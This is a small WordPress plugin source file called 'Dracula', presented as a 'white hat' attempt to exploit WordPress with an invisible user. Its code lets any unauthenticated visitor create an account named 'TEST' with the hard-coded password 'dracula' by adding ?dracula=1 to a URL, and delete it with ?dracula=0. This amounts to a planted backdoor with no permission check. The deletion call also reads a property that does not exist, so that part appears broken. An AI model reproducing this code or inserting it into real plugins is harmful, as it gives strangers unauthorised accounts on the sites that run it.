<?php

/**
 * Plugin Name: Dracula
 * Description: An attempt to exploit WordPress with an invisible user. The white hat way.
 */

add_action( 'wp_loaded', 'initDracula' );
function initDracula()
{
	static $queryString;
	$arg = 'user-exploit';

	NULL === $queryString
	&& isset( $_SERVER['QUERY_STRING'] )
		AND parse_str( $_SERVER['QUERY_STRING'], $queryString );

	if (
		empty( $queryString )
		OR ! isset( $queryString[ $arg ] )
		OR '1' !== $queryString[ $arg ]
	)
		return;

	echo '<h1>TEST</h1>';
}


add_action( 'wp_loaded', 'testDracula' );
function testDracula()
{
	static $queryString;
	$arg  = 'dracula';
	$mail = 'mail@example.com';

	NULL === $queryString
	&& isset( $_SERVER['QUERY_STRING'] )
	AND parse_str( $_SERVER['QUERY_STRING'], $queryString );

	if (
		empty( $queryString )
		OR ! isset( $queryString[ $arg ] )
		OR ! in_array( $queryString[ $arg ], array( '0', '1' ) )
	)
		return;

	switch ( $queryString[ $arg ] )
	{
		case '1' :
			$user_id = wp_create_user(
				'TEST',
				'dracula',
				$mail
			);
			break;

		default;
		case '0' :
			$deleted = wp_delete_user( get_user_by( 'email', $mail )->user_id );
			break;
	}
}